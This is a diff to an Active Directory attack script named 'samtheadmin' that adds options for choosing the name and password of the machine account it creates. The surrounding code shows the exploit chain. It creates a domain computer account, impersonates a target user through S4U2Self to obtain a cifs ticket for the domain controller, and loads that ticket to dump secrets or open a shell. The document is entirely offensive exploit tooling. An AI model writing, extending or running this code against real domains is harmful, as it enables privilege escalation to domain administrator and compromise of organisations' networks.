@@ -28,8 +28,15 @@ characters = list(string.ascii_letters + string.digits + "!@#$%^&*()")
 
 
 def samtheadmin(username, password, domain, options):
-    new_computer_name = f"SAMTHEADMIN-{random.randint(1,100)}$" 
-    new_computer_password = ''.join(random.choice(characters) for _ in range(12))
+    if options.computer_name:
+        new_computer_name = options.computer_name
+    else:
+        new_computer_name = f"SAMTHEADMIN-{random.randint(1,100)}$" 
+    
+    if options.computer_pass:
+        new_computer_password = options.computer_pass
+    else:
+        new_computer_password = ''.join(random.choice(characters) for _ in range(12))
 
     domain, username, password, lmhash, nthash = parse_identity(options)
     ldap_server, ldap_session = init_ldap_session(options, domain, username, password, lmhash, nthash)
@@ -69,13 +76,8 @@ def samtheadmin(username, password, domain, options):
 
 
     # Creating Machine Account
-    addmachineaccount = AddComputerSAMR(
-        username, 
-        password, 
-        domain, 
-        options,
-        computer_name=new_computer_name,
-        computer_pass=new_computer_password)
+    addmachineaccount = AddComputerSAMR(username, password, domain, 
+        options, computer_name=new_computer_name, computer_pass=new_computer_password)
     addmachineaccount.run()
 
 
@@ -117,7 +119,7 @@ def samtheadmin(username, password, domain, options):
         impersonate_target=target_user,
         target_spn=f"cifs/{dcfull}")
     executer.run()
-
+    
 
     adminticket = str(target_user + '.ccache')
     os.environ["KRB5CCNAME"] = adminticket
@@ -169,6 +171,8 @@ if __name__ == '__main__':
                                                                       'Useful if you can\'t translate the FQDN.'
                                                                       'specified in the account parameter will be used')
     parser.add_argument('-use-ldaps', action='store_true', help='Use LDAPS instead of LDAP')
+    parser.add_argument('-computer-name', action='store', required=False, help='Computer account to create within the domain')
+    parser.add_argument('-computer-pass', action='store', required=False, help=('Password to use for the newly created computer'))
     parser.add_argument('-impersonate', action='store', required=False, help='Account to attempt to impersonate via S4U2Self')
     parser.add_argument('-export', action='store_true', help='Save resulting ST in a file rather than dumping/popping a shell')
 
